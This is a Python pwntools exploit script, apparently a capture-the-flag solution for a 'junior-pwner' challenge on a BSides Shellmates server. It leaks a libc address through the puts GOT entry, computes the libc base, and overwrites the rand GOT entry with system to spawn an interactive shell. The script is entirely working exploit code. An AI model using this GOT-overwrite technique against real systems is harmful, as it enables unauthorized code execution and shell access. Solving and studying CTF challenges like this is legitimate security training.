from pwn import *
context.binary=exe=ELF("./chall_patched",checksec=False)
libc=ELF("./libc.so.6",checksec=False)

#p=process(exe.path)
p=remote("junior-pwner.bsides.shellmates.club",443,ssl=True)
def GDB():
	gdb.attach(p,gdbscript= 
		'''
		b*0x0000000000401311
		b*0x0000000000401327
		c
		'''
		)
	input()



#GDB()
rw_section=0x404a00
payload=b"A"*0x10
payload=flat(
	exe.got['puts'],
	exe.got['puts'],
	exe.got['puts'],
	exe.got['puts'],
	exe.got['puts'],
	exe.got['puts'],
	exe.got['puts'],
	exe.got['puts'],
	)
payload+=p64(exe.sym['messages']+0x30)
p.sendafter(b"Your Name:",payload)



leak=int.from_bytes(p.recvuntil(b"Your Name:",drop=True).split(b"\n")[1],"little")
log.info('[+]leak:'+hex(leak))
libc.address=leak-0x80ed0
log.info('[+]libc base:'+hex(libc.address))
log.info('[+]system:'+hex(libc.sym['system']))
payload=flat(
	next(libc.search(b"/bin/sh")),
	next(libc.search(b"/bin/sh")),
	next(libc.search(b"/bin/sh")),
	next(libc.search(b"/bin/sh")),
	next(libc.search(b"/bin/sh")),
	next(libc.search(b"/bin/sh")),
	next(libc.search(b"/bin/sh")),
	next(libc.search(b"/bin/sh")),
	)
payload+=p64(exe.sym['messages']+0x30)
p.send(payload)

print('[+]over writing puts got')
payload=flat(
	libc.sym['system'],
	libc.sym['system'],
	libc.sym['system'],
	libc.sym['system'],
	libc.sym['system'],
	libc.sym['system'],
	libc.sym['system'],
	libc.sym['system'],
	)
payload+=p64(exe.got['rand'])
p.sendafter(b"Your Name:",payload)

p.interactive()